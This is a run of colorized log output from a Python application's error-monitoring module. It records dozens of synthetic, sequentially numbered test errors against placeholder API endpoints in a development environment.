WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.929955Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4498'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930005Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m90[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4499'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930058Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4500'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930109Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4501'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930159Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4502'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930239Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4503'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930331Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4504'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930394Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4505'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930448Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4506'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930504Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4507'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930554Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4508'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930602Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4509'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4510'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930698Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4511'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930747Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4512'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930795Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4513'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930843Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4514'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930891Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4515'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4516'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.930986Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4517'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4518'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931082Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4519'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931129Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4520'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931175Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4521'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931222Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4522'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4523'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931421Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4524'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931481Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4525'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4526'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931586Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4527'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931636Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4528'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4529'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931734Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4530'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931783Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4531'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4532'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931882Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4533'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931932Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4534'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.931980Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4535'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932028Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4536'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932077Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4537'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
